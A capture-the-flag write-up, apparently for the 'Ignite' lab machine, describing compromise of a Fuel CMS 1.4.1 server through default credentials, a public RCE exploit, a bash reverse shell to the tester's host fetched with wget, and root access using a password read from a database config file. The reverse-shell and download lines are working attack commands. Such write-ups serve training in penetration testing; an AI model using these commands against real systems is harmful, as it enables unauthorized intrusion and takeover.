# Ignite

I started by running an nmap scan on the target machine. This gave me port 80 open. 

![nmap.png](/images/reports/ignite/nmap.png)

I then went on the IP address in browser that lead to the Fuel CMS landing page. On the information page we have the credentials listed as admin:admin. 

Going to [ip_address]/fuel redirects to the login page for CMS. I entered the aforementioned credentials to get in. We can see that the CMS version is 1.4.1. 

Using this information I looked for exploits using searchsploit, this resulted in an RCE exploit. I donwloaded the exploit and changed the IP address to that of the victim machine. 

![searchsploit.png](/images/reports/ignite/searchsploit.png)

NOTE: I had trouble with running the exploit at first. That is because in the exploit code we have a section for proxies. To solve the problem I commented out this section. 

![exploit.png](/images/reports/ignite/exploit.png)

After that I ran the exploit :

python2 fuel_cms.py

![cmd.png](/images/reports/ignite/cmd.png)

This way we get an cmd shell where we can input commands, this means that we can use a reverse shell to spawn a shell to the host machine. I create a new file on my machine rev_shell.sh with the following code inside:

bash -i >& /dev/tcp/192.168.129.128/4444 0>&1

![rev_shell.png](/images/reports/ignite/rev_shell.png)

Then inside the cmd shell, I downloaded this reverse shell on the target machine :

wget http://192.168.129.128:8000/rev_shell.sh

![file_on_system.png](/images/reports/ignite/file_on_system.png)

After that, in order for the reverse shell to work I changed the permissions : 

chmod +x rev_shell.sh

![chmod.png](/images/reports/ignite/chmod.png)

Next, I started a netcat listener to catch the shell, and I ran the code on the target machine. This worked and I got the shell back to my machine. 

![execute.png](/images/reports/ignite/execute.png)

![shell.png](/images/reports/ignite/shell.png)

For the user.txt flag, I just needed to look inside the /home/www-data directory and read the flag.

![user_flag.png](/images/reports/ignite/user_flag.png)

To escalate my privileges, I look on the information page for Fuel CMS, and at the 2nd point (install the database), we can see that there is a config file for the database. Looking inside that file for credentials could prove beneficial, and it did. I found there the password for root, "mememe”. Using this I switched the user inside the shell and I got the root. Finally, I just needed to look inside /root to find the root flag. 

![config.png](/images/reports/ignite/config.png)

![root.png](/images/reports/ignite/root.png)

![root_flag.png](/images/reports/ignite/root_flag.png)